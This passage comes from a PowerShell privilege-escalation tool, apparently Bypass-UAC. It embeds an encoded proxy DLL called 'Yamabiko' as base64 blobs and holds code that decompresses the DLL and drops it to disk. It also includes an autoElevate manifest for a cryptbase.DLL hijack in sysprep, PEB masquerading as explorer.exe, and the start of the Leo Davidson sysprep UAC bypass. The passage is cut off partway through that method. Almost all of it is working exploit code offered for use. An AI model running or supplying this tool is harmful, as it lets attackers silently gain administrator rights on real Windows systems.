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
'@
    
        $yamabiko64 = @'
        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    +RQlqGmqxl8XME  +tHuCudV0hRyoEvdwQ2eFgglRUE3u8XKz0HfXV4p1axyrYG0KdRjd72BZWEvwNLxQhf1IzfzzQISrwqvHcUwXyqzjSMjGjG0aD6ViHPti3Hqlam6zEe9R1CH7klBQcIbN4ryaTP6NhfmqEuykgDXcNnG/m4FiOSUwn8wnZrIAEcnXUMo/9M9a5DEPSEmJM0rNZ7E2npKjrOMsldaUlZZKGAslkbi0E08hhSaNAeqRT2rZGHaCpL9Q5msRZFF8tKezf0pF8PHg4i72uS/lvPjniLyhY9CKMU6KCsvmvdjglmi  wYVmTDr6ZSqoKugZuX1HHzpzy/d8Q/tTR7Lh2RBzRRG40OySnqlAxfWjbnhNnHolJBIpu4FySsk0Qruag8xhPWSSmVBXypdIZ1EfMfBtJZjpiW01MVpcN6Tpjd8T72Dyhl0wNqSpSV4tTVmppJFyeaWgtOikWimP5NSexVYqW09+rFaduYDflFRVXkGFs +kSZTezQRpqBnU1ixqXI81fyNyGQCZ881xbZu0RiaWpCn5hdkCWyVj7i3QSdi5jEsRWNDEmymW5OHRXYLuHUrEutUAzAo5kG6NRXGruebU97KpqO +lV8uGkElMGTE1W16vvMrWDd1xF5Ycn1c9w2gH7UlxdiWAVXU4hZJLIRnro1lmZ6xUDzrEgsTWYF2WdOLeHJZndKIRQ6ziQD7vhmO2QusEwJ8VGepzJZl8xayMz0gi4OKqhtyrAOja1Bh70Fw/VHcPB09zWhPioN6NiWThm/JhuHrWVqPpKVkhXWTvHUuR+2ZXy77Pbfcduh1ZH5Hs8Tm9Pt7T84w3zTTcB2sM6yns+uCI2lRiQeVYVlTFfY+jDly6uvpYoyQqi6FkJ1EY0FSNrK9lPZlx77s    +XqitcF1ncFIawv/oslH29/Fxr57u/3j5rcMP9r+3rcZ/JNyHrgw9o3K07AvzK/j34fstkhnn/8dskifPXNK4kQ6c43se5WvzZjMueS7RBfWTZ6/NoN9DrOPotSPv0H+jaowdVEnzsP4245jtj06848fMN6DeU0m98IE00zKU8O3lTOYRJQM0viXSgfBJlOSJDArlGCfV6OjuEwzLQNO5/sB/q3O5TQX6X7IpChNIuRHURsRZ   +Z3SjciZwvOZbRmBBri1MTT22keyuX0BACdYlx/GlIySinZ8oyLfXNLBo8Klm7+tVX2XS22NdOsPJ6+7BdTJ8u3QN+pgPl1VXY+G/Lsugwuq4A7mVfjYn1sU+jTKBNB/iCX9vPvfI3y2rIvgLHvSU9N89AipJ6IfQv/KtkyHC2eOFuOo1Jt00b10NeV5ZKzdcxdo1Kyrk1gYN  +JpYnrNNsqThm0rVF0X6Ze5zLeloVlilu0uD0DvHf1gUmz6DVEDfzj2j3IZX1DR75YcH9nz7yPf317pTCSSnpYeIuQblXj0qbmRo+kxNQ4BvBVjb097YtPa/SwSW1cZD/lX9U4KumNwpn1c1ZiIimlBpKjHhAo    +qrGjKas0FmQKuqLU3JMU3U1YSxGfLJC1FNNw0sbPSlRkROI0/rytYHK41mJuTJ7qzehZtmOr8DWejwvh5K6FMtosjGaPUeKJm3NQIsUZ7GynJQGJX0iMz87OIKi/Geg0rCU9CTZ31WNIsK7YXWLpDV6MrIvxkKTVY0JMalLjZ4lk0qWlNaycklBnVYumbg41mxLcu2Gkyl+6e9v+z8=
'@
    
        if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
            $Stream = new-object -TypeName System.IO.MemoryStream
            $DeflateStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($yamabiko64),[IO.Compression.CompressionMode]::Decompress)
            $buffer = New-Object Byte[](32768)
            $count = 0
            do
                {
                    $count = $DeflateStream.Read($buffer, 0, 1024)
                    if ($count -gt 0)
                        {
                            $Stream.Write($buffer, 0, $count)
                        }
                }
            While ($count -gt 0)
            $array = $stream.ToArray()
            $DeflateStream.Close()
            $Stream.Close()
            Set-Content -value $array -encoding byte -path $DllPath
            echo "[+] 64-bit Yamabiko: $DllPath"
        }
        else {
            $Stream = new-object -TypeName System.IO.MemoryStream
            $DeflateStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($yamabiko32),[IO.Compression.CompressionMode]::Decompress)
            $buffer = New-Object Byte[](32256)
            $count = 0
            do
                {
                    $count = $DeflateStream.Read($buffer, 0, 1024)
                    if ($count -gt 0)
                        {
                            $Stream.Write($buffer, 0, $count)
                        }
                }
            While ($count -gt 0)
            $array = $stream.ToArray()
            $DeflateStream.Close()
            $Stream.Close()
            Set-Content -value $array -encoding byte -path $DllPath
            echo "[+] 32-bit Yamabiko: $DllPath"
        }
    
    }
    
    #---------------
    # Static resources used for UAC elevation
    #---------------
    $WinPackageData = @"
    <?xml version="1.0" encoding="utf-8"?>
    <unattend xmlns="urn:schemas-microsoft-com:unattend">
        <servicing>
            <package action="install">
                <assemblyIdentity  name="Package_1_for_KB929761" version="6.0.1.1" language="neutral" processorArchitecture="x86" publicKeyToken="31bf3856ad364e35"/>
                <source location="%configsetroot%\Windows6.0-KB929761-x86.CAB" />
            </package>
         </servicing>
    </unattend>
"@
    
    $WinManifestData = @"
    <?xml version='1.0' encoding='utf-8' standalone='yes'?>
    <assembly
        xmlns="urn:schemas-microsoft-com:asm.v1"
        xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
        manifestVersion="1.0"
        >
       <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
          <requestedPrivileges>
            <requestedExecutionLevel
                level="requireAdministrator"
                uiAccess="false"
                />
          </requestedPrivileges>
        </security>
      </trustInfo>
      <asmv3:application>
        <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
          <autoElevate>true</autoElevate>
        </asmv3:windowsSettings>
      </asmv3:application>
      <file
          loadFrom="%systemroot%\system32\sysprep\cryptbase.DLL"
          name="cryptbase.DLL"
          />
     </assembly>
"@
    
    #---------------
    # Main() function logic, finally!
    #---------------

    # Perform some checks on the user account
    $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
    $HasAdminGroup = $(($(whoami /groups) -like "*S-1-5-32-544*").length -ne 0)
    $IsMediumIntegrity = $(($(whoami /groups) -like "*S-1-16-8192*").length -ne 0)
    
    if ($IsAdmin) {
        echo "`n[!] Listen, I know it's been a long day but you already have Administrator rights!`n"
        Return
    } if (!$HasAdminGroup) {
        echo "`n[!] The current user is not part of the Administrator group!`n"
        Return
    } if (!$IsMediumIntegrity) {
        echo "`n[!] The current process is not medium integrity!`n"
        Return
    }

    # Unexpected behaviour on Win7 32-bit when run multiple times..
    $ProcStatus = Get-WmiObject Win32_Process -Filter "ProcessId = '$PID'"
    if ($ProcStatus.CommandLine -eq "C:\Windows\explorer.exe") {
        echo "`n[!] To prevent unexpected behaviour running Bypass-UAC multiple times in the same shell is not advised!`n"
        Return
    }

    # Did the user provide a custom dll?
    if ($CustomDll) {
        if (![IO.File]::Exists($CustomDll)) {
            echo "`n[!] Custom proxy dll path is not valid!`n"
            Return
        } else {
            # Set proxy dll path
            $DllPath = $CustomDll
        }
    }

    #-------------------------#
    #    OS version table     #
    #-------------------------#
    # 10.0 -> Win10 / 2k16    #
    # 6.3  -> Win8.1 / 2k12R2 #
    # 6.2  -> Win8 / 2k12     #
    # 6.1  -> Win7 / 2k8R2    #
    # 6.0  -> Vista / 2k8     #
    #-------------------------#
    $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
    [double]$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
    if ($OSMajorMinor -lt 6.0) {
        echo "`n[!] Sorry, this OS version is not supported!`n"
        Return
    }

    # Bool flag architecture $x64/!$x64
    $x64 = $($env:PROCESSOR_ARCHITECTURE -eq "AMD64")

    # UAC bypass methods go here!
    switch ($Method) {
        # UACME method 1
        'UacMethodSysprep'
        {
            # Original Leo Davidson sysprep method
            # Works on everything pre 8.1
            if ($OSMajorMinor -ge 6.3) {
                echo "[!] Your OS does not support this method!`n"
                Return
            }

            # Impersonate explorer.exe
            echo "`n[!] Impersonating explorer.exe!"
            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"

            if ($DllPath) {
                echo "[>] Using custom proxy dll.."
                echo "[+] Dll path: $DllPath"
            } else {
                # Write Yamabiko.dll to disk
                echo "[>] Dropping proxy dll.."
                Emit-Yamabiko
            }

            # Expose IFileOperation COM object
